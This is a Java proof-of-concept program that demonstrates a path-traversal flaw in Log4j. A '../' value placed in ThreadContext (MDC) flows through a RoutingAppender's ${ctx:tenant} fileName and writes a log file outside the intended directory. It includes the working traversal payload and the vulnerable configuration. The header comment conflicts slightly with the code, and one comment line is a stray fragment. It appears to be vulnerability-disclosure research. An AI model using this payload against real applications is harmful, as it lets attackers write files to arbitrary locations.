// Deliberately NOT in an org.apache.logging.log4j.* package. A different
// class of finding from everything else in this investigation: not
// "attacker controls the config," but "attacker controls ordinary
// application data (a request header/param an app puts into MDC for
// entirely benign structured-logging reasons), and the CONFIG -- fully
// legitimate, authored by a trusted operator, doing exactly what
// RoutingAppender/${ctx:...}-in-fileName is documented for -- turns that
// into a file path with no path-traversal check anywhere in the chain.
//
// Grounded in real code, not assumed: FileManager.java:226,265 construct
// the target file via a plain `new File(filename)` -- no canonicalization,
// no containment check against the intended directory. Every
// @PluginBuilderAttribute value (fileName among them) is resolved through
// PluginBuilderAttributeVisitor.replace(event, rawValue), which performs
// ordinary ${...} substitution against the LogEvent, including
// ${ctx:KEY} -> ThreadContext (MDC). Nothing rejects "../" once that
// substitution result becomes a literal file path.
//
// This proof uses a plain FileAppender with fileName="${ctx:tenant}.log"
// under an intended base directory -- the simplest possible legitimate
// config shape (RoutingAppender adds routing on top of the identical
// underlying attribute-substitution mechanism; not needed to prove the
// core issue).

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.ConfigurationSource;
import org.apache.logging.log4j.core.config.Configurator;

public class MdcPathTraversalProof {

    private static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== Path traversal via untrusted MDC data into a fileName attribute ===\n");

        Path intendedDir = Files.createTempDirectory("mdc-traversal-intended");
        intendedDir.toFile().deleteOnExit();
        // The route template below appends ".log" itself (fileName=".../${ctx:tenant}.log"),
        // so the MDC value carries only the base name -- the actual escaped
        // file created will be "<markerBase>.log".
        String markerBase = "mdc-traversal-ESCAPED-" + System.nanoTime();
        Path outsideMarker = intendedDir.getParent().resolve(markerBase + ".log");
        outsideMarker.toFile().deleteOnExit();

        // A completely ordinary, legitimate config an operator would write for
        // per-key log file routing using RoutingAppender -- this exact shape
        // (Routes pattern="$${ctx:KEY}", a nested File whose own fileName uses
        // a plain ${ctx:KEY}) mirrors log4j-core-test's own
        // log4j-routing-purge.xml fixture, not an invented pattern. Only the
        // Routes-level "pattern" attribute needs $$-escaping (it is resolved
        // once at config-build time before being stored for later reuse); the
        // nested Route's own File node is built FRESH per LogEvent
        // (configuration.createConfiguration(appNode, event)), so its
        // attributes resolve directly against that event's MDC snapshot --
        // confirmed by testing both forms, not assumed from the reference
        // fixture's escaping alone.
        // place -- an ordinary FileAppender's fileName is resolved once at
        // config-load time, before any request-scoped MDC value exists.
        String benignConfig = "<?xml version=\"1.0\"?>\n"
                + "<Configuration status=\"error\">\n"
                + "  <Appenders>\n"
                + "    <Routing name=\"PerTenant\">\n"
                + "      <Routes pattern=\"$${ctx:tenant}\">\n"
                + "        <Route>\n"
                + "          <File name=\"Route-${ctx:tenant}\" fileName=\"" + intendedDir.toAbsolutePath()
                + "/${ctx:tenant}.log\">\n"
                + "            <PatternLayout pattern=\"%msg%n\"/>\n"
                + "          </File>\n"
                + "        </Route>\n"
                + "      </Routes>\n"
                + "    </Routing>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\"><AppenderRef ref=\"PerTenant\"/></Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        ConfigurationSource source =
                new ConfigurationSource(new java.io.ByteArrayInputStream(benignConfig.getBytes("UTF-8")));
        LoggerContext ctx = Configurator.initialize(MdcPathTraversalProof.class.getClassLoader(), source);
        try {
            // The attacker's only action: ordinary application input that ends
            // up in MDC -- e.g. an unvalidated request header
            // ("X-Tenant-Id: ../../../mdc-traversal-ESCAPED-...") that a
            // developer put into ThreadContext for entirely benign structured
            // logging reasons. No config access, no env var, no JMX, no URL.
            String traversalPayload = "../" + markerBase;
            ThreadContext.put("tenant", traversalPayload);

            Logger logger = ctx.getLogger(MdcPathTraversalProof.class);
            logger.info("request handled");
            logger.info("second line, same file handle");
        } finally {
            ThreadContext.clearMap();
            Configurator.shutdown(ctx);
        }

        boolean escaped = Files.exists(outsideMarker);
        boolean stayedInside;
        try (java.util.stream.Stream<Path> entries = Files.list(intendedDir)) {
            stayedInside = entries.findAny().isPresent();
        }

        assertTrue(
                "a file appeared OUTSIDE the intended directory (" + outsideMarker
                        + "), written there purely because a value read from ThreadContext (MDC) -- "
                        + "ordinary application data, not config content -- contained \"../\" and was "
                        + "substituted unchecked into a fileName attribute of an entirely legitimate, "
                        + "non-malicious config",
                escaped);
        assertTrue(
                "correspondingly, no file was created inside the intended directory for this request",
                !stayedInside);

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nUnlike every other finding in this session, this one needs no config-authoring\n"
                + "trust at all: the config here is exactly what a RoutingAppender/per-key-file\n"
                + "tutorial recommends, unmodified. The only untrusted input is whatever ordinary\n"
                + "application code puts into ThreadContext -- a request header, a query param, a\n"
                + "JWT claim -- routed through ${ctx:...} the way it is documented to be used. No\n"
                + "path-traversal sanitization exists anywhere between that MDC value and\n"
                + "`new File(filename)` in FileManager.");
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
